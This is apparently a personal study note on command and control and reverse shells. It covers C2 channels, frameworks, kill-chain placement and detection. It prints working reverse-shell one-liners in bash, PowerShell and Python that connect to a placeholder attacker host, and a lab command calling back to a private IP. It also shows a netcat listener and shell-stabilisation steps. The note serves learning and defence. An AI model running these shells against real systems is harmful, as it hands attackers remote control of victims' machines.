---
title: 08_Command_and_Control
draft: false
tags:
  - reverse
  - shell
  - c2c
  - c2
  - Command-and-Control
  - Beaconing
  - Stager
  - Interactive
NeedsReview: false
---
# 🛰️ What is C2 / Command and Control?

**Command and Control (C2 or C&C)** refers to the **communication channel** that an attacker establishes with a compromised system to **issue commands**, **receive data**, and **maintain control** over the target.

It’s a **critical phase** in the attack lifecycle, especially in **post-exploitation**, and is often the bridge between initial access and achieving final objectives like data exfiltration or lateral movement.

---

## 🔗 Where It Fits in the Unified Kill Chain (UKC)

|**Stage**|**Step**|
|---|---|
|**Through — Navigating Internals**|**Command & Control**|

This is the **core step** where the attacker maintains a foothold and orchestrates further actions.

---

## 🧠 Key Concepts

### 1. **C2 Channels**

These are the communication paths between the attacker and the victim. They can be:

- **Reverse Shells** (e.g., Netcat, Meterpreter)
- **Web-based C2** (e.g., HTTP/S, DNS tunneling)
- **Custom Protocols** (e.g., over ICMP, SMTP)
- **Beaconing** (periodic check-ins from the victim)

### 2. **C2 Infrastructure**

Attackers often use:

- **Dedicated servers** (VPS, bulletproof hosting)
- **Cloud services** (e.g., Dropbox, GitHub, Slack)
- **C2 frameworks** like:
    - **Cobalt Strike**
    - **Metasploit**
    - **Empire**
    - **Sliver**
    - **Mythic**

### 3. **C2 Modes**

- **Interactive**: Real-time shell access
- **Beaconing**: Periodic callbacks to receive commands
- **Staged**: Payloads are delivered in parts (e.g., stagers and stages)

---

## 🛡️ Detection & Mitigation

|**Technique**|**Description**|
|---|---|
|**Network Monitoring**|Detect unusual outbound traffic (e.g., to rare domains or IPs)|
|**Behavioral Analysis**|Look for suspicious processes or command execution|
|**Firewall Rules**|Restrict outbound traffic to known good destinations|
|**EDR/AV**|Detect known C2 tools and behaviors|
|**DNS Logging**|Catch DNS tunneling or beaconing patterns|

---

## 🧰 Example Tools

|Tool|Purpose|
|---|---|
|`Netcat`|Simple reverse shell|
|`Metasploit`|Full-featured C2 with payloads|
|`Cobalt Strike`|Commercial red team C2|
|`Empire`|PowerShell-based C2|
|`Sliver`|Golang-based open-source C2|

---
## Reverse Shell

> [!abstract] Summary  
> A **reverse shell** is a type of shell session where the **target machine initiates a connection back to the attacker's machine**, allowing the attacker to execute commands remotely.
> 
> This is the opposite of a **bind shell**, where the target listens for incoming connections.

### 🔁 How It Works

1. **Attacker sets up a listener** on their machine (e.g., using `nc -lvnp 4444`).
2. **Target executes a payload** that connects back to the attacker (e.g., `bash -i >& /dev/tcp/attacker_ip/4444 0>&1`).
3. A **remote shell session** is established, allowing the attacker to run commands as the user who executed the payload.

---

### 🧱 Why Use a Reverse Shell?

- **Bypasses firewalls**: Most firewalls block inbound connections but allow outbound traffic.
- **Stealthier**: Easier to blend in with normal outbound traffic.
- **Useful in restricted environments**: Especially when only outbound connections are allowed.

	Let's run a bash reverse shell for our service running: # nc -lvnp 443
	os-shell> bash -c "bash -i >& /dev/tcp/10.10.15.146/443 0>&1"

---

### 🧰 Common Tools & Payloads

|Tool|Usage|
|---|---|
|`Netcat (nc)`|Simple reverse shell listener and payload|
|`Metasploit`|Auto-generates reverse shell payloads|
|`msfvenom`|Create custom reverse shell binaries|
|`nishang`|PowerShell reverse shells|
|`socat`|Encrypted reverse shells|
|`bash`, `python`, `perl`, `php`|One-liner reverse shells|

---

### 🔐 Reverse Shell Payload Examples

### Bash (Linux):

```bash
bash -i >& /dev/tcp/attacker_ip/4444 0>&1
```

### PowerShell (Windows):

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient('attacker_ip',4444);..."
```

### Python:

```python
import socket,subprocess,os
s=socket.socket();s.connect(("attacker_ip",4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```


---
We beautify the reverse shell:

$ python3 -c 'import pty;pty.spawn("/bin/bash")'

CTRL+Z

stty raw -echo

fg

export TERM=xterm

---

### 🔗 Where It Fits in the Unified Kill Chain (UKC)

|UKC Step|Role of Reverse Shell|
|---|---|
|**Exploitation**|Delivered as a payload after exploiting a vulnerability|
|**Execution**|Triggered via script, macro, or command injection|
|**Command & Control**|Primary use — establishes remote control|
|**Persistence**|Can be configured to reconnect on reboot|
|**Lateral Movement**|Used to pivot to other systems|

---

### 🛡️ Detection & Mitigation

- **Monitor outbound connections** to unusual IPs or ports.
- **Use EDR/AV** to detect known reverse shell patterns.
- **Restrict outbound traffic** with firewall rules.
- **Use application whitelisting** to prevent unauthorized script execution.
